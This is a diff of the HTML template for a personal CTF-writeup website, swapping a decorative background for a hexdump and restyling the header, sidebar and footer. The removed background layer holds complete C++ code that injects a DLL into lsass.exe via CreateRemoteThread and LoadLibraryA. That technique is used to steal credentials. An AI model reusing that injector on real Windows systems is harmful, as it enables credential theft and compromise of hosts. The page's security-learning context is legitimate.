@@ -15,101 +15,61 @@
     <link rel="stylesheet" href="/assets/css/style.css">
 </head>
 <body>
-    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
-    <div id="bg-code-layer" aria-hidden="true">
-#include &lt;windows.h&gt;
-#include &lt;iostream&gt;
-#include &lt;tlhelp32.h&gt;
-
-// Internal structures for PEB and API Hooking
-typedef struct _UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING, *PUNICODE_STRING;
-
-DWORD FindProcessId(const std::wstring& processName) {
-    PROCESSENTRY32 processInfo;
-    processInfo.dwSize = sizeof(processInfo);
-
-    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
-
-    Process32First(processesSnapshot, &processInfo);
-    if (!processName.compare(processInfo.szExeFile)) {
-        CloseHandle(processesSnapshot);
-        return processInfo.th32ProcessID;
-    }
-
-    while (Process32Next(processesSnapshot, &processInfo)) {
-        if (!processName.compare(processInfo.szExeFile)) {
-            CloseHandle(processesSnapshot);
-            return processInfo.th32ProcessID;
-        }
-    }
-
-    CloseHandle(processesSnapshot);
-    return 0;
-}
-
-int main() {
-    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
-    DWORD processId = FindProcessId(L"lsass.exe");
-
-    if (!processId) {
-        std::cerr << "[-] Target process not found." << std::endl;
-        return 1;
-    }
-
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
-    if (!hProcess) {
-        std::cerr << "[-] Failed to open process." << std::endl;
-        return 1;
-    }
-
-    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
-    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
-
-    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
-        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
-        pDllPath, 0, 0);
-
-    WaitForSingleObject(hLoadThread, INFINITE);
-    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
-    CloseHandle(hLoadThread);
-    CloseHandle(hProcess);
-
-    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
-    return 0;
-}
+    <!-- Subtle Hexdump Background to mimic RE tool -->
+    <div class="bg-hexdump" aria-hidden="true">
+00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
+00000010  03 00 3e 00 01 00 00 00  60 10 40 00 00 00 00 00  |..>.....`.@.....|
+00000020  40 00 00 00 00 00 00 00  48 30 00 00 00 00 00 00  |@.......H0......|
+00000030  00 00 00 00 40 00 38 00  09 00 40 00 1a 00 19 00  |....@.8...@.....|
+00000040  06 00 00 00 04 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
+00000050  40 00 40 00 00 00 00 00  40 00 40 00 00 00 00 00  |@.@.....@.@.....|
+00000060  f8 01 00 00 00 00 00 00  f8 01 00 00 00 00 00 00  |................|
+00000070  08 00 00 00 00 00 00 00  03 00 00 00 04 00 00 00  |................|
+00000080  38 02 00 00 00 00 00 00  38 02 40 00 00 00 00 00  |8.......8.@.....|
+00000090  38 02 40 00 00 00 00 00  1c 00 00 00 00 00 00 00  |8.@.............|
+000000a0  1c 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|
+000000b0  01 00 00 00 05 00 00 00  00 00 00 00 00 00 00 00  |................|
+000000c0  00 00 40 00 00 00 00 00  00 00 40 00 00 00 00 00  |..@.......@.....|
+000000d0  e4 08 00 00 00 00 00 00  e4 08 00 00 00 00 00 00  |................|
+000000e0  00 10 00 00 00 00 00 00  01 00 00 00 06 00 00 00  |................|
+000000f0  e8 0d 00 00 00 00 00 00  e8 0d 60 00 00 00 00 00  |........`.@.....|
+00000100  e8 0d 60 00 00 00 00 00  48 02 00 00 00 00 00 00  |..`.....H.......|
+00000110  50 02 00 00 00 00 00 00  00 10 00 00 00 00 00 00  |P...............|
+00000120  02 00 00 00 06 00 00 00  08 0e 00 00 00 00 00 00  |................|
+00000130  08 0e 60 00 00 00 00 00  08 0e 60 00 00 00 00 00  |..`.......`.....|
+00000140  f0 01 00 00 00 00 00 00  f0 01 00 00 00 00 00 00  |................|
+00000150  08 00 00 00 00 00 00 00  04 00 00 00 04 00 00 00  |................|
+00000160  54 02 00 00 00 00 00 00  54 02 40 00 00 00 00 00  |T.......T.@.....|
+00000170  54 02 40 00 00 00 00 00  44 00 00 00 00 00 00 00  |T.@.....D.......|
+00000180  44 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |D...............|
+00000190  51 e5 74 64 06 00 00 00  00 00 00 00 00 00 00 00  |Q.td............|
+000001a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000001b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000001c0  08 00 00 00 00 00 00 00  52 e5 74 64 04 00 00 00  |........R.td....|
+000001d0  e8 0d 00 00 00 00 00 00  e8 0d 60 00 00 00 00 00  |........`.@.....|
     </div>
 
-    <div class="glow-orb-1"></div>
-    <div class="glow-orb-2"></div>
-
     <header>
-        <div class="container">
-            <a href="/" class="site-title">KAAAMMUUI</a>
+        <div class="page-container">
+            <a href="/" class="site-wordmark">0xKAAAMMUUI</a>
             <nav>
-                <a href="/" >Home</a>
-                <a href="/projects/" >Projects</a>
-                <a href="/game-modding/" >Game Modding</a>
-                <a href="/writeups/" class="active">CTF Writeups</a>
-                <a href="/notes/" >Notes</a>
+                <a href="/" >0x0000 [.text] Home</a>
+                <a href="/writeups/" class="active">0x1000 [.data] Writeups</a>
+                <a href="/game-modding/" >0x2000 [.ro] Game Mods</a>
+                <a href="/notes/" >0x3000 [.bss] Notes</a>
             </nav>
         </div>
     </header>
 
-    <main>
-        <div class="container page-layout">
+    <div class="page-container">
+        <div class="container writeup-grid">
     <article class="post">
-        <header class="post-header">
-            <h1>Challenge Name: base64</h1>
+        <header class="post-header" style="margin-bottom: 2rem;">
+            <h1 style="color: var(--text-bright);">Challenge Name: base64</h1>
             
-            <p class="post-meta">Published: April 27, 2026</p>
-            
-            
-            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            <p style="color: var(--text-muted); font-size: 1.1rem; border-left: 2px solid var(--syn-address); padding-left: 1rem; margin-top: 1rem;">
+                Writeup from Program Misuse
+            </p>
             
         </header>
 
@@ -155,36 +115,129 @@ int main() {
         </div>
     </article>
     
-    <aside class="toc-container">
-        <div class="toc-sidebar" id="toc-sidebar">
-            <h3>On this page</h3>
-            <ul id="toc-list"></ul>
+    <aside class="context-sidebar">
+        <div class="docked-window" style="margin-bottom: 2rem;">
+            <div class="window-header">
+                <span>Registers [Context]</span>
+            </div>
+            <div class="pwndbg-panel" style="padding: 1rem; border-radius: 0 0 4px 4px; border: 1px solid var(--border-color); border-top: none;">
+                <div class="pwndbg-row" style="margin-bottom: 0.5rem;">
+                    <span class="pwndbg-label" style="width: 50px;">RSI</span>
+                    <span class="pwndbg-str" style="color: var(--text-bright);">"Challenge Na..."</span>
+                </div>
+                
+                <div class="pwndbg-row" style="margin-bottom: 0.5rem;">
+                    <span class="pwndbg-label" style="width: 50px;">TYPE</span>
+                    <span class="pwndbg-addr">Platform</span>
+                </div>
+                
+                
+                <div class="pwndbg-row" style="margin-bottom: 0.5rem;">
+                    <span class="pwndbg-label" style="width: 50px;">RDI</span>
+                    <span class="pwndbg-instr">&lt;pwn.college&gt;</span>
+                </div>
+                
+                
+                <div class="pwndbg-row" style="margin-bottom: 0.5rem;">
+                    <span class="pwndbg-label" style="width: 50px;">RDX</span>
+                    <span class="pwndbg-value">2026-04-27</span>
+                </div>
+                
+            </div>
+        </div>
+
+        <div class="docked-window">
+            <div class="window-header">
+                <span>Stack [TOC]</span>
+            </div>
+            <div class="pwndbg-panel" style="padding: 1rem; border-radius: 0 0 4px 4px; border: 1px solid var(--border-color); border-top: none;">
+                <ul id="toc-list" style="list-style-type: none; padding-left: 0; font-family: var(--font-mono); font-size: 0.85rem; margin: 0;">
+                    <!-- JS fills this -->
+                </ul>
+            </div>
         </div>
     </aside>
 </div>
 
-    </main>
+<script>
+// Add Term Headers to code blocks
+document.addEventListener("DOMContentLoaded", function() {
+    const pres = document.querySelectorAll(".post-content pre");
+    pres.forEach(pre => {
+        // Only apply if it contains a code block and isn't already processed
+        if (!pre.querySelector("code")) return;
+        
+        let lang = "bash";
+        const code = pre.querySelector("code");
+        if (code && code.className) {
+            const match = code.className.match(/language-(\w+)/);
+            if (match) lang = match[1];
+        }
+        
+        const header = document.createElement("div");
+        header.className = "term-header";
+        
+        const titleSpan = document.createElement("span");
+        if (lang === "nasm" || lang === "asm") {
+            titleSpan.innerHTML = '<span style="color: var(--syn-danger);">gdb></span> disassemble';
+        } else if (lang === "python" || lang === "py") {
+            titleSpan.innerHTML = '<span style="color: var(--syn-string);">python3</span> exploit.py';
+        } else {
+            titleSpan.innerHTML = '<span style="color: var(--syn-danger);">himanshu@kali</span>:~$';
+        }
+        
+        const typeSpan = document.createElement("span");
+        typeSpan.innerText = lang;
+        
+        header.appendChild(titleSpan);
+        header.appendChild(typeSpan);
+        
+        pre.parentNode.insertBefore(header, pre);
+    });
+});
+</script>
+
+    </div>
 
     <footer>
-        <div class="container">
-            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
-                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
-                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
-                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
-                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
-                <a href="mailto:himanshuparate601@gmail.com">Email</a>
-                <span style="color: var(--text-muted);">Discord: himasnhu</span>
-            </div>
-            
-            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
-                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
-                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
-                </a>
-            </div>
-
-            <p>&copy; 2026 Himanshu Kaaammuui. Hosted natively on GitHub Pages.</p>
+        <div class="page-container">
+            <p>
+                <a href="https://github.com/HimanshuP601" target="_blank">0xGITHUB</a> | 
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">0xLINKEDIN</a> | 
+                <a href="https://medium.com/@HimanshuP601" target="_blank">0xMEDIUM</a> | 
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">0xPWN.COLLEGE</a> | 
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">0xHTB</a>
+            </p>
+            <p style="margin-top: 1rem; color: var(--border-color);">&copy; 2026 Himanshu Parate</p>
         </div>
     </footer>
-    <script src="/assets/js/main.js"></script>
+
+    <script>
+        console.log("%c" +
+            "  .o oOOOOOOOo                                            OOOo\n" +
+            "  Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO\n" +
+            "  OboO''''''''''''.OOo. .oOOOOOo.    OOOo.oOOOOOo..''''''''''OO\n" +
+            "  OOP.oOOOOOOOOOOO \"POOOOOOOOOOOo.   `\"OOOOOOOOOP,OOOOOOOOOOOB'\n" +
+            "  `O'OOOO'     `OOOOo\"OOOOOOOOOOO` .adOOOOOOOOO\"oOOO'    `OOOOo\n" +
+            "  .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO\n" +
+            "  OOOOO                 '\"OOOOOOOOOOOOOOOO\"`                oOO\n" +
+            " oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.\n" +
+            " oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO\n" +
+            " OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO\"`  '\"OOOOOOOOOOOOO.OOOOOOOOOOOOOO\n" +
+            " \"OOOO\"       \"YOoOOOOMOIONODOO\"`  .   '\"OOROAOPOEOOOoOY\"     \"OOO\"\n" +
+            "    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`\n" +
+            "    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .\n" +
+            "    .            oOOP\"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO\"OOo\n" +
+            "                 '%o  OOOO\"%OOOO%\"%OOOOO\"OOOOOO\"OOO':\n" +
+            "                      `$\"  `OOOO' `O\"Y ' `OOOO'  o             .\n" +
+            "    .                  .     OP\"          : o     . \n" +
+            "HTB{w3lc0m3_t0_my_m3m0ry}",
+            "color: red; font-family: monospace; font-size: 14px; font-weight: bold;"
+        );
+    </script>
+    <script type="module">
+        import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+        mermaid.initialize({ startOnLoad: true, theme: 'dark' });
+    </script>
 </body>
 </html>
